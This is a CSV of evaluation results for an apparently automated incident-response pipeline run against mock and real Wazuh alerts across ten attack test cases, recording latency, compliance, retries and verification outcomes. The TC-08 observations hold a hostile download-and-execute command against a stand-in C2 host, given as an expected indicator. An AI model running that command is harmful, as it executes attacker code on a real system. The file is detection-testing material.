run,evaluationType,TC,attack,severity,environmentStatus,telemetry,compliance,investigationSec,decisionSec,timingMode,retries,interventionTypes,verificationMode,verificationResult,workflowCompleted,finalStatus,playbook,observations
mock-original,MOCK,TC-01,Brute Force,medium,AVAILABLE (mock),HYBRID: alert came from REAL lab agent 'attack-endpoint' (run-evaluation.ts selects the latest alert by rule id only) + MOCK verification,COMPLIANT,22.35,0.06,"WITH_MANUAL_GAPS (stepwise, interrupted run; see repeated single-pass for clean latency)",0,,MOCK,RESOLVED,true,resolved,PB-SSH-BRUTEFORCE,MOCK_RUN_CONTAMINATION: this row is NOT a pure mock alert - the incident was built from a real Wazuh alert of agent attack-endpoint; only its verification is mock
mock-original,MOCK,TC-02,Malware,high,AVAILABLE (mock),MOCK_ALERT_JSON,COMPLIANT,2052.1,3426.44,"WITH_MANUAL_GAPS (stepwise, interrupted run; see repeated single-pass for clean latency)",0,,MOCK,RESOLVED,true,resolved,PB-MALWARE,
mock-original,MOCK,TC-03,Phishing,medium,AVAILABLE (mock),MOCK_ALERT_JSON,COMPLIANT,1539.62,0.06,"WITH_MANUAL_GAPS (stepwise, interrupted run; see repeated single-pass for clean latency)",13,ANALYST_IOC_CORRECTION,MOCK,RESOLVED,true,resolved,PB-PHISHING,
mock-original,MOCK,TC-04,Account Compromise,high,AVAILABLE (mock),MOCK_ALERT_JSON,COMPLIANT,2073.71,3417.65,"WITH_MANUAL_GAPS (stepwise, interrupted run; see repeated single-pass for clean latency)",0,,MOCK,RESOLVED,true,resolved,PB-ACCOUNT-COMPROMISE,
mock-original,MOCK,TC-05,PowerShell,high,AVAILABLE (mock),MOCK_ALERT_JSON,COMPLIANT,2104.73,3385.57,"WITH_MANUAL_GAPS (stepwise, interrupted run; see repeated single-pass for clean latency)",0,,MOCK,RESOLVED,true,resolved,PB-POWERSHELL,
mock-original,MOCK,TC-06,SQL Injection,medium,AVAILABLE (mock),MOCK_ALERT_JSON,COMPLIANT,41.53,0.05,"WITH_MANUAL_GAPS (stepwise, interrupted run; see repeated single-pass for clean latency)",0,,MOCK,RESOLVED,true,resolved,PB-SQL-INJECTION,
mock-original,MOCK,TC-07,Command & Control,high,AVAILABLE (mock),MOCK_ALERT_JSON,COMPLIANT,3797.68,1690.4,"WITH_MANUAL_GAPS (stepwise, interrupted run; see repeated single-pass for clean latency)",12,PLAYBOOK_SEED_UPDATE;MITRE_CATALOG_UPDATE,MOCK,RESOLVED,true,resolved,PB-C2,
mock-original,MOCK,TC-08,Suspicious Process,medium,AVAILABLE (mock),MOCK_ALERT_JSON,COMPLIANT,868.1,0.05,"WITH_MANUAL_GAPS (stepwise, interrupted run; see repeated single-pass for clean latency)",6,ANALYST_IOC_CORRECTION,MOCK,RESOLVED,true,resolved,PB-SUSPICIOUS-PROCESS,
mock-original,MOCK,TC-09,Data Exfiltration,high,AVAILABLE (mock),MOCK_ALERT_JSON,COMPLIANT,3825.01,1660.88,"WITH_MANUAL_GAPS (stepwise, interrupted run; see repeated single-pass for clean latency)",12,PLAYBOOK_SEED_UPDATE;MITRE_CATALOG_UPDATE,MOCK,RESOLVED,true,resolved,PB-DATA-EXFIL,
mock-original,MOCK,TC-10,Privilege Escalation,critical,AVAILABLE (mock),MOCK_ALERT_JSON,COMPLIANT,5195.02,289.8,"WITH_MANUAL_GAPS (stepwise, interrupted run; see repeated single-pass for clean latency)",0,,MOCK,RESOLVED,true,resolved,PB-ACCOUNT-COMPROMISE,
real-clean,REAL_WAZUH,TC-01,Brute Force,medium,AVAILABLE,REAL_EVENTS_STOCK_RULE,COMPLIANT,23.05,0.07,UNINTERRUPTED_SCRIPTED,0,,REAL_WAZUH,RESOLVED,true,resolved,PB-SSH-BRUTEFORCE,
real-clean,REAL_WAZUH,TC-02,Malware,high,AVAILABLE,REAL_ACTION_CUSTOM_RULE,COMPLIANT,33.79,0.05,UNINTERRUPTED_SCRIPTED,0,,NONE,,false,open,PB-MALWARE,"EXPECTED_IOC_MISSING (before any correction): hash:275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f, file:/root/Downloads/Invoice_Q4_2026.xls.exe || REHUNT_FAILED: REHUNT_INSUFFICIENT_CRITERIA ""No supported IOC is available to query."" — no verification, incident not resolved || ACTION_DIFFERS_FROM_PREFERRED: actual [ACT-ISOLATE-ENDPOINT] vs preferred [ACT-QUARANTINE-FILE,ACT-BLOCK-HASH] (allowed set still governs compliance)"
real-clean,REAL_WAZUH,TC-03,Phishing,medium,AVAILABLE,CONTROLLED_TELEMETRY_CUSTOM_RULE,NOT_EVALUATED,,,UNINTERRUPTED_SCRIPTED,5,,NONE,,false,open,,NO_VALID_RECOMMENDATION after 5 attempts
real-clean,REAL_WAZUH,TC-04,Account Compromise,high,AVAILABLE,REAL_EVENTS_STOCK_RULE,COMPLIANT,41.55,0.05,UNINTERRUPTED_SCRIPTED,0,,REAL_WAZUH,RESOLVED,true,resolved,PB-ACCOUNT-COMPROMISE,
real-clean,REAL_WAZUH,TC-05,PowerShell,high,ENVIRONMENT_UNAVAILABLE,ENVIRONMENT_UNAVAILABLE,NOT_EVALUATED,,,UNINTERRUPTED_SCRIPTED,0,,NONE,,false,,,ENVIRONMENT_UNAVAILABLE: Requires a Windows endpoint with a Wazuh agent (Sysmon/PowerShell logging). None exists in this environment.
real-clean,REAL_WAZUH,TC-06,SQL Injection,medium,AVAILABLE,REAL_EVENTS_STOCK_RULE,COMPLIANT,22.32,0.04,UNINTERRUPTED_SCRIPTED,0,,REAL_WAZUH,RESOLVED,true,resolved,PB-SQL-INJECTION,
real-clean,REAL_WAZUH,TC-07,Command & Control,high,AVAILABLE,CONTROLLED_TELEMETRY_CUSTOM_RULE,COMPLIANT,98.12,0.06,UNINTERRUPTED_SCRIPTED,0,,REAL_WAZUH,RESOLVED,true,resolved,PB-C2,"SELF_TARGETING_STEP (not counted in the six criteria): ACT-BLOCK-DESTINATION-IP targets 172.19.0.5, the monitored endpoint's own address; the compliance evaluator accepts it because that IP is an evidence-linked IOC"
real-clean,REAL_WAZUH,TC-08,Suspicious Process,medium,AVAILABLE,CONTROLLED_TELEMETRY_CUSTOM_RULE,NOT_EVALUATED,,,UNINTERRUPTED_SCRIPTED,5,,NONE,,false,open,,"EXPECTED_IOC_MISSING (before any correction): process:/tmp/.cache/kworkerd, command:curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash || NO_VALID_RECOMMENDATION after 5 attempts"
real-clean,REAL_WAZUH,TC-09,Data Exfiltration,high,AVAILABLE,CONTROLLED_TELEMETRY_CUSTOM_RULE,COMPLIANT,38.09,0.06,UNINTERRUPTED_SCRIPTED,0,,REAL_WAZUH,RESOLVED,true,resolved,PB-DATA-EXFIL,
real-clean,REAL_WAZUH,TC-10,Privilege Escalation,critical,AVAILABLE,REAL_ACTION_CUSTOM_RULE,COMPLIANT,24.97,0.06,UNINTERRUPTED_SCRIPTED,0,,NONE,,false,open,PB-ACCOUNT-COMPROMISE,"REHUNT_FAILED: REHUNT_INSUFFICIENT_CRITERIA ""No supported IOC is available to query."" — no verification, incident not resolved"
real-intervention,REAL_WAZUH,TC-01,Brute Force,medium,AVAILABLE,REAL_EVENTS_STOCK_RULE,COMPLIANT,22.18,0.06,UNINTERRUPTED_SCRIPTED,0,,REAL_WAZUH,RESOLVED,true,resolved,PB-SSH-BRUTEFORCE,
real-intervention,REAL_WAZUH,TC-02,Malware,high,AVAILABLE,REAL_ACTION_CUSTOM_RULE,COMPLIANT,56.9,0.06,UNINTERRUPTED_SCRIPTED,0,,NONE,,false,open,PB-MALWARE,"EXPECTED_IOC_MISSING (before any correction): hash:275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f, file:/root/Downloads/Invoice_Q4_2026.xls.exe || REHUNT_FAILED: REHUNT_INSUFFICIENT_CRITERIA ""No supported IOC is available to query."" — no verification, incident not resolved || ACTION_DIFFERS_FROM_PREFERRED: actual [ACT-ISOLATE-ENDPOINT] vs preferred [ACT-QUARANTINE-FILE,ACT-BLOCK-HASH] (allowed set still governs compliance)"
real-intervention,REAL_WAZUH,TC-03,Phishing,medium,AVAILABLE,CONTROLLED_TELEMETRY_CUSTOM_RULE,COMPLIANT,265.41,0.06,UNINTERRUPTED_SCRIPTED,3,ANALYST_IOC_CORRECTION,REAL_WAZUH,RESOLVED,true,resolved,PB-PHISHING,
real-intervention,REAL_WAZUH,TC-04,Account Compromise,high,AVAILABLE,REAL_EVENTS_STOCK_RULE,COMPLIANT,34.28,0.06,UNINTERRUPTED_SCRIPTED,0,,REAL_WAZUH,RESOLVED,true,resolved,PB-ACCOUNT-COMPROMISE,
real-intervention,REAL_WAZUH,TC-05,PowerShell,high,ENVIRONMENT_UNAVAILABLE,ENVIRONMENT_UNAVAILABLE,NOT_EVALUATED,,,UNINTERRUPTED_SCRIPTED,0,,NONE,,false,,,ENVIRONMENT_UNAVAILABLE: Requires a Windows endpoint with a Wazuh agent (Sysmon/PowerShell logging). None exists in this environment.
real-intervention,REAL_WAZUH,TC-06,SQL Injection,medium,AVAILABLE,REAL_EVENTS_STOCK_RULE,COMPLIANT,22.07,0.05,UNINTERRUPTED_SCRIPTED,0,,REAL_WAZUH,RESOLVED,true,resolved,PB-SQL-INJECTION,
real-intervention,REAL_WAZUH,TC-07,Command & Control,high,AVAILABLE,CONTROLLED_TELEMETRY_CUSTOM_RULE,COMPLIANT,47.8,0.06,UNINTERRUPTED_SCRIPTED,0,,REAL_WAZUH,RESOLVED,true,resolved,PB-C2,"SELF_TARGETING_STEP (not counted in the six criteria): ACT-BLOCK-DESTINATION-IP targets 172.19.0.5, the monitored endpoint's own address; the compliance evaluator accepts it because that IP is an evidence-linked IOC"
real-intervention,REAL_WAZUH,TC-08,Suspicious Process,medium,AVAILABLE,CONTROLLED_TELEMETRY_CUSTOM_RULE,COMPLIANT,128.9,0.06,UNINTERRUPTED_SCRIPTED,3,ANALYST_IOC_CORRECTION,REAL_WAZUH,RESOLVED,true,resolved,PB-SUSPICIOUS-PROCESS,"EXPECTED_IOC_MISSING (before any correction): process:/tmp/.cache/kworkerd, command:curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash"
real-intervention,REAL_WAZUH,TC-09,Data Exfiltration,high,AVAILABLE,CONTROLLED_TELEMETRY_CUSTOM_RULE,COMPLIANT,46.46,0.06,UNINTERRUPTED_SCRIPTED,0,,REAL_WAZUH,RESOLVED,true,resolved,PB-DATA-EXFIL,"SELF_TARGETING_STEP (not counted in the six criteria): ACT-BLOCK-DESTINATION-IP targets 172.19.0.5, the monitored endpoint's own address; the compliance evaluator accepts it because that IP is an evidence-linked IOC"
real-intervention,REAL_WAZUH,TC-10,Privilege Escalation,critical,AVAILABLE,REAL_ACTION_CUSTOM_RULE,COMPLIANT,26.05,0.05,UNINTERRUPTED_SCRIPTED,0,,NONE,,false,open,PB-ACCOUNT-COMPROMISE,"REHUNT_FAILED: REHUNT_INSUFFICIENT_CRITERIA ""No supported IOC is available to query."" — no verification, incident not resolved"
real-recurrence-control,REAL_WAZUH,TC-01,Brute Force,medium,AVAILABLE,REAL_EVENTS_STOCK_RULE,COMPLIANT,21.22,0.06,UNINTERRUPTED_SCRIPTED,1,,REAL_WAZUH,NOT_RESOLVED,true,investigating,PB-SSH-BRUTEFORCE,RECURRENCE_CONTROL: attack repeated 2026-09-30T12:12:17.800Z after the response completed; recurrence alert seen in the indexer (1790770358.1896566)